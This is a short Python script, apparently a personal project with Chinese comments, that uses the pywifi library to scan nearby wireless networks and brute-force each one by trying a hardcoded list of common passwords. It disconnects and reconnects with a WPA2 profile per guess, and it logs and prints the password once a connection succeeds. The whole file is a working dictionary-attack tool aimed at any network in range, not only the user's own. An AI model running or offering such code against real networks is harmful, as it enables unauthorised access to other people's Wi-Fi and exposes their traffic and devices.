# -*- coding: utf-8 -*-
# @Time    : 2023/3/19 16:50
# @Author  : MyNextWeekend
import pywifi
from pywifi import const  # 获取连接状态的常量库
import time
import logging

logger = logging.getLogger()
logger.setLevel(logging.DEBUG)

"""
解决pywifi模块不支持mac系统的问题
1. git clone -b macos_dev https://github.com/awkman/pywifi.git
2. cd pywifi/
3. pip install .
"""


class MyWifi:
    def __init__(self):
        wifi = pywifi.PyWiFi()
        self.ifaces = wifi.interfaces()[0]  # 取第一个无限网卡
        logger.info(f'使用的无线网卡是：{self.ifaces.name()}')  # 输出无线网卡名称

    def get_wifi_name(self):
        self.ifaces.scan()  # 扫描
        bessis = self.ifaces.scan_results()
        for data in bessis:
            # print(data.ssid)  # 输出wifi名称
            yield data.ssid

    def conn_wifi(self, wifi_name, password):
        self.ifaces.disconnect()  # 断开网卡连接
        time.sleep(3)  # 缓冲3秒

        profile = pywifi.profile.Profile()  # 配置文件
        profile.ssid = wifi_name  # wifi名称
        profile.auth = const.AUTH_ALG_OPEN  # 需要密码
        profile.akm.append(const.AKM_TYPE_WPA2PSK)  # 加密类型
        profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
        profile.key = password

        self.ifaces.remove_all_network_profiles()  # 删除其他配置文件
        tmp_profile = self.ifaces.add_network_profile(profile)  # 加载配置文件

        self.ifaces.connect(tmp_profile)  # 连接
        time.sleep(5)
        if self.ifaces.status() == const.IFACE_CONNECTED:
            logger.info(f"wifi【{wifi_name}】的密码是{password}")
            self.ifaces.disconnect()  # 断开连接
            return True
        else:
            # logger.info("错误的密码")
            return False


if __name__ == '__main__':
    passwords = ["123456789", "66666666", "1234567890"]

    m = MyWifi()
    for name in m.get_wifi_name():
        if name is None:
            continue
        for pw in passwords:
            try:
                if m.conn_wifi(name, pw):
                    print("success get password")
                    exit(0)
            except Exception as e:
                print(e)
    print("done")
